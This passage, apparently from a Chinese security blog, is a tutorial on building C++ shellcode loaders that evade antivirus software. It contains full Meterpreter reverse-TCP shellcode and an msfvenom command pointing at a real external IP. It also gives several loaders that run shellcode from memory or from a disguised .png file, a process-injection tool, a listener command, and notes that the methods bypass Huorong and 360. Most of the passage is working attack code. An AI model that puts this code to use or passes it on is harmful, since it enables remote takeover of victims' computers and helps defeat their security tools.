class="string">&quot;\x48\x31\xc0\xac\x3c\x61\x7c\x02\x2c\x20\x41\xc1\xc9\x0d\x41&quot;</span></span><br><span class="line"><span class="string">&quot;\x01\xc1\xe2\xed\x52\x48\x8b\x52\x20\x41\x51\x8b\x42\x3c\x48&quot;</span></span><br><span class="line"><span class="string">&quot;\x01\xd0\x66\x81\x78\x18\x0b\x02\x0f\x85\x72\x00\x00\x00\x8b&quot;</span></span><br><span class="line"><span class="string">&quot;\x80\x88\x00\x00\x00\x48\x85\xc0\x74\x67\x48\x01\xd0\x50\x44&quot;</span></span><br><span class="line"><span class="string">&quot;\x8b\x40\x20\x49\x01\xd0\x8b\x48\x18\xe3\x56\x4d\x31\xc9\x48&quot;</span></span><br><span class="line"><span class="string">&quot;\xff\xc9\x41\x8b\x34\x88\x48\x01\xd6\x48\x31\xc0\xac\x41\xc1&quot;</span></span><br><span class="line"><span class="string">&quot;\xc9\x0d\x41\x01\xc1\x38\xe0\x75\xf1\x4c\x03\x4c\x24\x08\x45&quot;</span></span><br><span class="line"><span class="string">&quot;\x39\xd1\x75\xd8\x58\x44\x8b\x40\x24\x49\x01\xd0\x66\x41\x8b&quot;</span></span><br><span class="line"><span class="string">&quot;\x0c\x48\x44\x8b\x40\x1c\x49\x01\xd0\x41\x8b\x04\x88\x48\x01&quot;</span></span><br><span class="line"><span class="string">&quot;\xd0\x41\x58\x41\x58\x5e\x59\x5a\x41\x58\x41\x59\x41\x5a\x48&quot;</span></span><br><span class="line"><span class="string">&quot;\x83\xec\x20\x41\x52\xff\xe0\x58\x41\x59\x5a\x48\x8b\x12\xe9&quot;</span></span><br><span class="line"><span class="string">&quot;\x4b\xff\xff\xff\x5d\x49\xbe\x77\x73\x32\x5f\x33\x32\x00\x00&quot;</span></span><br><span class="line"><span class="string">&quot;\x41\x56\x49\x89\xe6\x48\x81\xec\xa0\x01\x00\x00\x49\x89\xe5&quot;</span></span><br><span class="line"><span class="string">&quot;\x49\xbc\x02\x00\x10\xe1\x7c\xdf\xd9\xf3\x41\x54\x49\x89\xe4&quot;</span></span><br><span class="line"><span class="string">&quot;\x4c\x89\xf1\x41\xba\x4c\x77\x26\x07\xff\xd5\x4c\x89\xea\x68&quot;</span></span><br><span class="line"><span class="string">&quot;\x01\x01\x00\x00\x59\x41\xba\x29\x80\x6b\x00\xff\xd5\x6a\x0a&quot;</span></span><br><span class="line"><span class="string">&quot;\x41\x5e\x50\x50\x4d\x31\xc9\x4d\x31\xc0\x48\xff\xc0\x48\x89&quot;</span></span><br><span class="line"><span class="string">&quot;\xc2\x48\xff\xc0\x48\x89\xc1\x41\xba\xea\x0f\xdf\xe0\xff\xd5&quot;</span></span><br><span class="line"><span class="string">&quot;\x48\x89\xc7\x6a\x10\x41\x58\x4c\x89\xe2\x48\x89\xf9\x41\xba&quot;</span></span><br><span class="line"><span class="string">&quot;\x99\xa5\x74\x61\xff\xd5\x85\xc0\x74\x0a\x49\xff\xce\x75\xe5&quot;</span></span><br><span class="line"><span class="string">&quot;\xe8\x93\x00\x00\x00\x48\x83\xec\x10\x48\x89\xe2\x4d\x31\xc9&quot;</span></span><br><span class="line"><span class="string">&quot;\x6a\x04\x41\x58\x48\x89\xf9\x41\xba\x02\xd9\xc8\x5f\xff\xd5&quot;</span></span><br><span class="line"><span class="string">&quot;\x83\xf8\x00\x7e\x55\x48\x83\xc4\x20\x5e\x89\xf6\x6a\x40\x41&quot;</span></span><br><span class="line"><span class="string">&quot;\x59\x68\x00\x10\x00\x00\x41\x58\x48\x89\xf2\x48\x31\xc9\x41&quot;</span></span><br><span class="line"><span class="string">&quot;\xba\x58\xa4\x53\xe5\xff\xd5\x48\x89\xc3\x49\x89\xc7\x4d\x31&quot;</span></span><br><span class="line"><span class="string">&quot;\xc9\x49\x89\xf0\x48\x89\xda\x48\x89\xf9\x41\xba\x02\xd9\xc8&quot;</span></span><br><span class="line"><span class="string">&quot;\x5f\xff\xd5\x83\xf8\x00\x7d\x28\x58\x41\x57\x59\x68\x00\x40&quot;</span></span><br><span class="line"><span class="string">&quot;\x00\x00\x41\x58\x6a\x00\x5a\x41\xba\x0b\x2f\x0f\x30\xff\xd5&quot;</span></span><br><span class="line"><span class="string">&quot;\x57\x59\x41\xba\x75\x6e\x4d\x61\xff\xd5\x49\xff\xce\xe9\x3c&quot;</span></span><br><span class="line"><span class="string">&quot;\xff\xff\xff\x48\x01\xc3\x48\x29\xc6\x48\x85\xf6\x75\xb4\x41&quot;</span></span><br><span class="line"><span class="string">&quot;\xff\xe7\x58\x6a\x00\x59\x49\xc7\xc2\xf0\xb5\xa2\x56\xff\xd5&quot;</span>;</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line"><span class="comment">//  void* Memory; //等价于PVOID</span></span><br><span class="line">    PVOID Memory = <span class="literal">NULL</span>;</span><br><span class="line">    Memory=<span class="built_in">VirtualAlloc</span>(<span class="literal">NULL</span>, <span class="built_in">sizeof</span>(buf), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);</span><br><span class="line"><span class="comment">//  ShowWindow(GetConsoleWindow(), SW_HIDE);  //去除黑色框框（二）</span></span><br><span class="line">    <span class="built_in">memcpy</span>(Memory, buf, <span class="built_in">sizeof</span>(buf));</span><br><span class="line">    ((<span class="built_in">void</span>(*)())Memory)();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="C-loader-2"><a href="#C-loader-2" class="headerlink" title="C++loader-2"></a>C++loader-2</h2><h3 id="VirtualAlloc（和load1对比）"><a href="#VirtualAlloc（和load1对比）" class="headerlink" title="VirtualAlloc（和load1对比）"></a>VirtualAlloc（和load1对比）</h3><blockquote><p>typedef 声明</p></blockquote><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">typedef</span> <span class="title">void</span><span class="params">(_stdcall* CODE)</span><span class="params">()</span></span>;  <span class="comment">// 定义一个函数指针类型CODE</span></span><br><span class="line"><span class="meta">#<span class="keyword">pragma</span> comment(linker,<span class="string">&quot;/subsystem:\&quot;windows\&quot; /entry:\&quot;mainCRTStartup\&quot;&quot;</span>)</span></span><br><span class="line"><span class="type">unsigned</span> <span class="type">char</span> buf[] =</span><br><span class="line"><span class="string">&quot;\xfc\x48\x83\xe4\xf0\xe8\xcc\x00\x00\x00\x41\x51\x41\x50\x52&quot;</span></span><br><span class="line">......</span><br><span class="line"><span class="string">&quot;\xff\xe7\x58\x6a\x00\x59\x49\xc7\xc2\xf0\xb5\xa2\x56\xff\xd5&quot;</span>;</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    PVOID p = <span class="literal">NULL</span>;</span><br><span class="line">    p = <span class="built_in">VirtualAlloc</span>(<span class="literal">NULL</span>, <span class="built_in">sizeof</span>(buf), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);</span><br><span class="line">    <span class="keyword">if</span> (p == <span class="literal">NULL</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">memcpy</span>(p, buf, <span class="built_in">sizeof</span>(buf));</span><br><span class="line">  <span class="comment">//和load1的区别在此，使用的运行shellcode的方法不一样，先在前面声明了一个名为code的函数指针</span></span><br><span class="line">    CODE code = (CODE)p;</span><br><span class="line">    <span class="built_in">code</span>();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="C-loader-3"><a href="#C-loader-3" class="headerlink" title="C++loader-3"></a>C++loader-3</h2><h3 id="分离免杀-VirtualAlloc"><a href="#分离免杀-VirtualAlloc" class="headerlink" title="分离免杀 + VirtualAlloc"></a>分离免杀 + VirtualAlloc</h3><p>这简单的分离免杀，竟然可以过火绒！？</p><blockquote><p>把shellcode放入 alvin.png 文件中，与 shellcode 加载器放到同一个目录。alvin.png可以用cs或者msf生成的bin或者raw文件改后缀为png即可</p></blockquote><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;Windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> _CRT_SECURE_NO_WARNINGS</span></span><br><span class="line"><span class="meta">#<span class="keyword">pragma</span> <span class="keyword">warning</span>(disable : 4996)</span></span><br><span class="line"><span class="meta">#<span class="keyword">pragma</span> comment(linker,<span class="string">&quot;/subsystem:\&quot;windows\&quot; /entry:\&quot;mainCRTStartup\&quot;&quot;</span>)</span></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="comment">//主要区别在此</span></span><br><span class="line">    FILE* fp;<span class="comment">//定义文件指针</span></span><br><span class="line">    <span class="type">size_t</span> size;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">char</span>* buffer;</span><br><span class="line">    fp = <span class="built_in">fopen</span>(<span class="string">&quot;alvin.png&quot;</span>, <span class="string">&quot;rb&quot;</span>);<span class="comment">//以二进制（b），读文件（r）</span></span><br><span class="line">    <span class="built_in">fseek</span>(fp, <span class="number">0</span>, SEEK_END);<span class="comment">//C 库函数 int fseek(FILE *stream, long int offset, int whence) 设置流 stream 的文件位置为给定的偏移 offset，参数 offset 意味着从给定的 whence 位置查找的字节数。</span></span><br><span class="line">    size = <span class="built_in">ftell</span>(fp);<span class="comment">//C 库函数 long int ftell(FILE *stream) 返回给定流 stream 的当前文件位置。相当于计算大小</span></span><br><span class="line">    <span class="built_in">fseek</span>(fp, <span class="number">0</span>, SEEK_SET);</span><br><span class="line">    buffer = (<span class="type">unsigned</span> <span class="type">char</span>*)<span class="built_in">malloc</span>(size);<span class="comment">//申请空间的指针</span></span><br><span class="line">    <span class="built_in">fread</span>(buffer, size, <span class="number">1</span>, fp);<span class="comment">//从fp读取数据到buffer中</span></span><br><span class="line">    <span class="comment">//C 库函数 size_t fread(void *ptr, size_t size, size_t nmemb, FILE *stream) 从给定流 stream 读取数据到 ptr 所指向的数组中。</span></span><br><span class="line">    <span class="comment">//后面就一样了</span></span><br><span class="line">    <span class="type">void</span>* exec = <span class="built_in">VirtualAlloc</span>(<span class="number">0</span>, size, MEM_COMMIT, PAGE_EXECUTE_READWRITE);</span><br><span class="line">    <span class="built_in">memcpy</span>(exec, buffer, size);</span><br><span class="line">    ((<span class="built_in">void</span>(*) ())exec)();</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="C-loader-4"><a href="#C-loader-4" class="headerlink" title="C++loader-4"></a>C++loader-4</h2><h3 id="CreateFileA-VirtualAlloc"><a href="#CreateFileA-VirtualAlloc" class="headerlink" title="CreateFileA + VirtualAlloc"></a>CreateFileA + VirtualAlloc</h3><blockquote><p>能不能过杀软还没测</p></blockquote><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;windows.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span>* argv[])</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="comment">//打开要执行的ShellCode文件，CreateFileA函数打开文件，返回句柄，我们就可以对文件进行操作</span></span><br><span class="line">    HANDLE hFile = <span class="built_in">CreateFileA</span>(<span class="string">&quot;payload.bin&quot;</span>, GENERIC_READ, <span class="number">0</span>, <span class="literal">NULL</span>, OPEN_ALWAYS, <span class="number">0</span>, <span class="literal">NULL</span>);</span><br><span class="line">    <span class="keyword">if</span> (hFile == INVALID_HANDLE_VALUE)<span class="comment">//如果返回句柄出错，则怎么样怎么样  </span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;CreateFile Error&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    DWORD dwSize = <span class="number">0</span>;</span><br><span class="line">    <span class="comment">//获取ShellCode的总大小</span></span><br><span class="line">    dwSize = <span class="built_in">GetFileSize</span>(hFile, <span class="literal">NULL</span>);</span><br><span class="line">    <span class="comment">//PVOID lpAddress = NULL;</span></span><br><span class="line">    <span class="comment">//申请一块可读可写可执行的内存</span></span><br><span class="line">    LPVOID lpAddress = <span class="built_in">VirtualAlloc</span>(<span class="literal">NULL</span>, dwSize, MEM_COMMIT, PAGE_EXECUTE_READWRITE);</span><br><span class="line">    <span class="keyword">if</span> (lpAddress == <span class="literal">NULL</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;VirtualAlloc EWrror&quot;</span>);</span><br><span class="line">        <span class="built_in">CloseHandle</span>(hFile);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//将文件读取到申请的内存中</span></span><br><span class="line">    DWORD dwRead = <span class="number">0</span>;</span><br><span class="line">    <span class="built_in">ReadFile</span>(hFile, lpAddress, dwSize, &amp;dwRead, <span class="number">0</span>);</span><br><span class="line">    <span class="comment">//执行ShellCode</span></span><br><span class="line">    ((<span class="built_in">void</span>(*)())lpAddress)();</span><br><span class="line">    <span class="comment">//执行shellcode还有其他方法__asm()，涉及到汇编的知识，可以使用上述方式执行shellcode，也可以使用汇编语言，执行,如下：不过实际编译会出问题 先暂时放在这里！</span></span><br><span class="line">    <span class="comment">//__asm()&#123;call lpAddress;&#125;</span></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p>注：如果gcc编译不了就要使用visual studio来编译了~~</p></blockquote><h2 id="C-loader-5"><a href="#C-loader-5" class="headerlink" title="C++loader-5"></a>C++loader-5</h2><h3 id="shellcode进程注入-OpenProcess-VirtualAllocEx-CreateRemoteThread"><a href="#shellcode进程注入-OpenProcess-VirtualAllocEx-CreateRemoteThread" class="headerlink" title="shellcode进程注入 + OpenProcess + VirtualAllocEx + CreateRemoteThread"></a>shellcode进程注入 + OpenProcess + VirtualAllocEx + CreateRemoteThread</h3><p>需要传入进程参数pid，这个pid可以注入计算机或者ie等等各种进程之中。我们拿到的shell的pid就是我们注入进程的pid，我们的shellcode类似于寄生在其进程之中~~~~</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment">#生成shellcode</span></span><br><span class="line">msfvenom -p windows/x64/meterpreter/reverse_tcp lhost=124.223.217.243 lport=4321 -f c</span><br><span class="line"><span class="comment">#shellcode</span></span><br><span class="line">unsigned char buf[] =</span><br><span class="line"><span class="string">&quot;\xfc\x48\x83\xe4\xf0\xe8\xcc\x00\x00\x00\x41\x51\x41\x50\x52&quot;</span></span><br><span class="line"><span class="string">&quot;\x51\x56\x48\x31\xd2\x65\x48\x8b\x52\x60\x48\x8b\x52\x18\x48&quot;</span></span><br><span class="line"><span class="string">&quot;\x8b\x52\x20\x48\x8b\x72\x50\x4d\x31\xc9\x48\x0f\xb7\x4a\x4a&quot;</span></span><br><span class="line"><span class="string">&quot;\x48\x31\xc0\xac\x3c\x61\x7c\x02\x2c\x20\x41\xc1\xc9\x0d\x41&quot;</span></span><br><span class="line"><span class="string">&quot;\x01\xc1\xe2\xed\x52\x48\x8b\x52\x20\x41\x51\x8b\x42\x3c\x48&quot;</span></span><br><span class="line"><span class="string">&quot;\x01\xd0\x66\x81\x78\x18\x0b\x02\x0f\x85\x72\x00\x00\x00\x8b&quot;</span></span><br><span class="line"><span class="string">&quot;\x80\x88\x00\x00\x00\x48\x85\xc0\x74\x67\x48\x01\xd0\x50\x44&quot;</span></span><br><span class="line"><span class="string">&quot;\x8b\x40\x20\x49\x01\xd0\x8b\x48\x18\xe3\x56\x4d\x31\xc9\x48&quot;</span></span><br><span class="line"><span class="string">&quot;\xff\xc9\x41\x8b\x34\x88\x48\x01\xd6\x48\x31\xc0\xac\x41\xc1&quot;</span></span><br><span class="line"><span class="string">&quot;\xc9\x0d\x41\x01\xc1\x38\xe0\x75\xf1\x4c\x03\x4c\x24\x08\x45&quot;</span></span><br><span class="line"><span class="string">&quot;\x39\xd1\x75\xd8\x58\x44\x8b\x40\x24\x49\x01\xd0\x66\x41\x8b&quot;</span></span><br><span class="line"><span class="string">&quot;\x0c\x48\x44\x8b\x40\x1c\x49\x01\xd0\x41\x8b\x04\x88\x48\x01&quot;</span></span><br><span class="line"><span class="string">&quot;\xd0\x41\x58\x41\x58\x5e\x59\x5a\x41\x58\x41\x59\x41\x5a\x48&quot;</span></span><br><span class="line"><span class="string">&quot;\x83\xec\x20\x41\x52\xff\xe0\x58\x41\x59\x5a\x48\x8b\x12\xe9&quot;</span></span><br><span class="line"><span class="string">&quot;\x4b\xff\xff\xff\x5d\x49\xbe\x77\x73\x32\x5f\x33\x32\x00\x00&quot;</span></span><br><span class="line"><span class="string">&quot;\x41\x56\x49\x89\xe6\x48\x81\xec\xa0\x01\x00\x00\x49\x89\xe5&quot;</span></span><br><span class="line"><span class="string">&quot;\x49\xbc\x02\x00\x10\xe1\x7c\xdf\xd9\xf3\x41\x54\x49\x89\xe4&quot;</span></span><br><span class="line"><span class="string">&quot;\x4c\x89\xf1\x41\xba\x4c\x77\x26\x07\xff\xd5\x4c\x89\xea\x68&quot;</span></span><br><span class="line"><span class="string">&quot;\x01\x01\x00\x00\x59\x41\xba\x29\x80\x6b\x00\xff\xd5\x6a\x0a&quot;</span></span><br><span class="line"><span class="string">&quot;\x41\x5e\x50\x50\x4d\x31\xc9\x4d\x31\xc0\x48\xff\xc0\x48\x89&quot;</span></span><br><span class="line"><span class="string">&quot;\xc2\x48\xff\xc0\x48\x89\xc1\x41\xba\xea\x0f\xdf\xe0\xff\xd5&quot;</span></span><br><span class="line"><span class="string">&quot;\x48\x89\xc7\x6a\x10\x41\x58\x4c\x89\xe2\x48\x89\xf9\x41\xba&quot;</span></span><br><span class="line"><span class="string">&quot;\x99\xa5\x74\x61\xff\xd5\x85\xc0\x74\x0a\x49\xff\xce\x75\xe5&quot;</span></span><br><span class="line"><span class="string">&quot;\xe8\x93\x00\x00\x00\x48\x83\xec\x10\x48\x89\xe2\x4d\x31\xc9&quot;</span></span><br><span class="line"><span class="string">&quot;\x6a\x04\x41\x58\x48\x89\xf9\x41\xba\x02\xd9\xc8\x5f\xff\xd5&quot;</span></span><br><span class="line"><span class="string">&quot;\x83\xf8\x00\x7e\x55\x48\x83\xc4\x20\x5e\x89\xf6\x6a\x40\x41&quot;</span></span><br><span class="line"><span class="string">&quot;\x59\x68\x00\x10\x00\x00\x41\x58\x48\x89\xf2\x48\x31\xc9\x41&quot;</span></span><br><span class="line"><span class="string">&quot;\xba\x58\xa4\x53\xe5\xff\xd5\x48\x89\xc3\x49\x89\xc7\x4d\x31&quot;</span></span><br><span class="line"><span class="string">&quot;\xc9\x49\x89\xf0\x48\x89\xda\x48\x89\xf9\x41\xba\x02\xd9\xc8&quot;</span></span><br><span class="line"><span class="string">&quot;\x5f\xff\xd5\x83\xf8\x00\x7d\x28\x58\x41\x57\x59\x68\x00\x40&quot;</span></span><br><span class="line"><span class="string">&quot;\x00\x00\x41\x58\x6a\x00\x5a\x41\xba\x0b\x2f\x0f\x30\xff\xd5&quot;</span></span><br><span class="line"><span class="string">&quot;\x57\x59\x41\xba\x75\x6e\x4d\x61\xff\xd5\x49\xff\xce\xe9\x3c&quot;</span></span><br><span class="line"><span class="string">&quot;\xff\xff\xff\x48\x01\xc3\x48\x29\xc6\x48\x85\xf6\x75\xb4\x41&quot;</span></span><br><span class="line"><span class="string">&quot;\xff\xe7\x58\x6a\x00\x59\x49\xc7\xc2\xf0\xb5\xa2\x56\xff\xd5&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">#利用sublime对值处理：</span></span><br><span class="line">\xfc\x48\x83\xe4\xf0\xe8\xcc\x00\x00\x00\x41\x51\x41\x50\x52\x51\x56\x48\x31\xd2\x65\x48\x8b\x52\x60\x48\x8b\x52\x18\x48\x8b\x52\x20\x48\x8b\x72\x50\x4d\x31\xc9\x48\x0f\xb7\x4a\x4a\x48\x31\xc0\xac\x3c\x61\x7c\x02\x2c\x20\x41\xc1\xc9\x0d\x41\x01\xc1\xe2\xed\x52\x48\x8b\x52\x20\x41\x51\x8b\x42\x3c\x48\x01\xd0\x66\x81\x78\x18\x0b\x02\x0f\x85\x72\x00\x00\x00\x8b\x80\x88\x00\x00\x00\x48\x85\xc0\x74\x67\x48\x01\xd0\x50\x44\x8b\x40\x20\x49\x01\xd0\x8b\x48\x18\xe3\x56\x4d\x31\xc9\x48\xff\xc9\x41\x8b\x34\x88\x48\x01\xd6\x48\x31\xc0\xac\x41\xc1\xc9\x0d\x41\x01\xc1\x38\xe0\x75\xf1\x4c\x03\x4c\x24\x08\x45\x39\xd1\x75\xd8\x58\x44\x8b\x40\x24\x49\x01\xd0\x66\x41\x8b\x0c\x48\x44\x8b\x40\x1c\x49\x01\xd0\x41\x8b\x04\x88\x48\x01\xd0\x41\x58\x41\x58\x5e\x59\x5a\x41\x58\x41\x59\x41\x5a\x48\x83\xec\x20\x41\x52\xff\xe0\x58\x41\x59\x5a\x48\x8b\x12\xe9\x4b\xff\xff\xff\x5d\x49\xbe\x77\x73\x32\x5f\x33\x32\x00\x00\x41\x56\x49\x89\xe6\x48\x81\xec\xa0\x01\x00\x00\x49\x89\xe5\x49\xbc\x02\x00\x10\xe1\x7c\xdf\xd9\xf3\x41\x54\x49\x89\xe4\x4c\x89\xf1\x41\xba\x4c\x77\x26\x07\xff\xd5\x4c\x89\xea\x68\x01\x01\x00\x00\x59\x41\xba\x29\x80\x6b\x00\xff\xd5\x6a\x0a\x41\x5e\x50\x50\x4d\x31\xc9\x4d\x31\xc0\x48\xff\xc0\x48\x89\xc2\x48\xff\xc0\x48\x89\xc1\x41\xba\xea\x0f\xdf\xe0\xff\xd5\x48\x89\xc7\x6a\x10\x41\x58\x4c\x89\xe2\x48\x89\xf9\x41\xba\x99\xa5\x74\x61\xff\xd5\x85\xc0\x74\x0a\x49\xff\xce\x75\xe5\xe8\x93\x00\x00\x00\x48\x83\xec\x10\x48\x89\xe2\x4d\x31\xc9\x6a\x04\x41\x58\x48\x89\xf9\x41\xba\x02\xd9\xc8\x5f\xff\xd5\x83\xf8\x00\x7e\x55\x48\x83\xc4\x20\x5e\x89\xf6\x6a\x40\x41\x59\x68\x00\x10\x00\x00\x41\x58\x48\x89\xf2\x48\x31\xc9\x41\xba\x58\xa4\x53\xe5\xff\xd5\x48\x89\xc3\x49\x89\xc7\x4d\x31\xc9\x49\x89\xf0\x48\x89\xda\x48\x89\xf9\x41\xba\x02\xd9\xc8\x5f\xff\xd5\x83\xf8\x00\x7d\x28\x58\x41\x57\x59\x68\x00\x40\x00\x00\x41\x58\x6a\x00\x5a\x41\xba\x0b\x2f\x0f\x30\xff\xd5\x57\x59\x41\xba\x75\x6e\x4d\x61\xff\xd5\x49\xff\xce\xe9\x3c\xff\xff\xff\x48\x01\xc3\x48\x29\xc6\x48\x85\xf6\x75\xb4\x41\xff\xe7\x58\x6a\x00\x59\x49\xc7\xc2\xf0\xb5\xa2\x56\xff\xd5</span><br></pre></td></tr></table></figure><p>将shellcode填入下方，并编译</p><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;windows.h&gt;</span></span></span><br><span class="line"><span class="type">unsigned</span> <span class="type">char</span> ShellCode[] = <span class="string">&quot;shellcode代码&quot;</span>;</span><br><span class="line"><span class="function">BOOL <span class="title">InjectShellCode</span><span class="params">(<span class="type">int</span> Pid)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    HANDLE Handle, remoteThread;</span><br><span class="line">    PVOID remoteBuffer;<span class="comment">//shellcode之后会被写入的地址，是一个指针</span></span><br><span class="line">    <span class="comment">//开进程，返回进程句柄，OpenProcess获取访问进程的权限</span></span><br><span class="line">    Handle = <span class="built_in">OpenProcess</span>(PROCESS_ALL_ACCESS, FALSE, Pid);</span><br><span class="line">    <span class="comment">//申请空间，在指定进程中分配内存，前面的方法是</span></span><br><span class="line">    remoteBuffer = <span class="built_in">VirtualAllocEx</span>(Handle, <span class="literal">NULL</span>, <span class="built_in">sizeof</span>(ShellCode), (MEM_RESERVE | MEM_COMMIT), PAGE_EXECUTE_READWRITE);</span><br><span class="line">    <span class="comment">//将shellcode写入进程内存</span></span><br><span class="line">    <span class="built_in">WriteProcessMemory</span>(Handle, remoteBuffer, ShellCode, <span class="built_in">sizeof</span>(ShellCode), <span class="literal">NULL</span>);</span><br><span class="line">    <span class="comment">//创建远程线程执行shellcode</span></span><br><span class="line">    remoteThread = <span class="built_in">CreateRemoteThread</span>(Handle, <span class="literal">NULL</span>, <span class="number">0</span>, (LPTHREAD_START_ROUTINE)remoteBuffer, <span class="literal">NULL</span>, <span class="number">0</span>, <span class="literal">NULL</span>);</span><br><span class="line">    <span class="built_in">CloseHandle</span>(Handle);<span class="comment">//若是关闭的太快会无法上线</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span> *argv[])</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="type">char</span> *p;</span><br><span class="line">    <span class="type">int</span> pid;</span><br><span class="line">    errno = <span class="number">0</span>;</span><br><span class="line">    <span class="type">long</span> conv = <span class="built_in">strtol</span>(argv[<span class="number">1</span>], &amp;p, <span class="number">10</span>);<span class="comment">//该函数的意思就是 argv[1]传入参数，该参数中的数字返回到conv，字符串返回给&amp;p指针的位置~~</span></span><br><span class="line"> <span class="comment">//C 库函数 long int strtol(const char *str, char **endptr, int base) 把参数 str 所指向的字符串根据给定的 base 转换为一个长整数（类型为 long int 型），base 必须介于 2 和 36（包含）之间，或者是特殊值 0。</span></span><br><span class="line"> <span class="comment">//str -- 要转换为长整数的字符串。</span></span><br><span class="line"><span class="comment">//endptr -- 对类型为 char* 的对象的引用，其值由函数设置为 str 中数值后的下一个字符。</span></span><br><span class="line"><span class="comment">//base -- 基数，必须介于 2 和 36（包含）之间，或者是特殊值 0。</span></span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 检查错误：例如，输入的是字符串而不是整数，或者输入的整数超过int范围</span></span><br><span class="line">    <span class="keyword">if</span> (errno != <span class="number">0</span> || *p != <span class="string">&#x27;\0&#x27;</span> || conv &gt; INT_MAX || conv &lt; INT_MIN) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        pid = conv;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%d\n&quot;</span>, pid);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">InjectShellCode</span>(pid);<span class="comment">//自定义注入shellcode的函数</span></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>找到clac的进程pid，注入pid，执行程序</p><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202209192021190.png" alt="image-20220919202143656" style="zoom:50%;" /><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment">#开启监听</span></span><br><span class="line">handler -p windows/x64/meterpreter/reverse_tcp -H 124.223.217.243 -P 4321</span><br><span class="line"><span class="comment">#上线msf</span></span><br><span class="line">.\C++loader-5.exe 6448</span><br></pre></td></tr></table></figure><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202209192048569.png" alt="image-20220919204807185" style="zoom:50%;" /><blockquote><p>注意：</p><ul><li>若是关闭线程关闭的太快会导致无法上线，若是注入的进程被关闭，则我们的shell也会被下线。可以注释CloseHandle(Handle);</li><li>另外，这种shellcode直接暴露在代码之中，很容易被杀，所以后面我们可以配合混淆加密，或者是远程加载shellcode的方法进行躲避杀软查杀</li></ul></blockquote><h2 id="C-loader-6"><a href="#C-loader-6" class="headerlink" title="C++loader-6"></a>C++loader-6</h2><h3 id="异或"><a href="#异或" class="headerlink" title="异或"></a>异或</h3><p>异或关键在于，使用两次密钥异或加密处理之后，会还原数据~~</p><p>另外，我们可以不止异或一个值：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">a =  b ^ c ====&gt;     b = a ^ c</span><br><span class="line">a = b ^ c ^ d  ====&gt;    b = a ^ c ^ d</span><br></pre></td></tr></table></figure><blockquote><p><a href="https://www.ruanyifeng.com/blog/2021/01/_xor.html">异或运算 XOR 教程</a></p></blockquote><h3 id="xor异或-VirtualAlloc-CreateThread-x3D-x3D-x3D-x3D-gt-可以免杀逃避火绒和360"><a 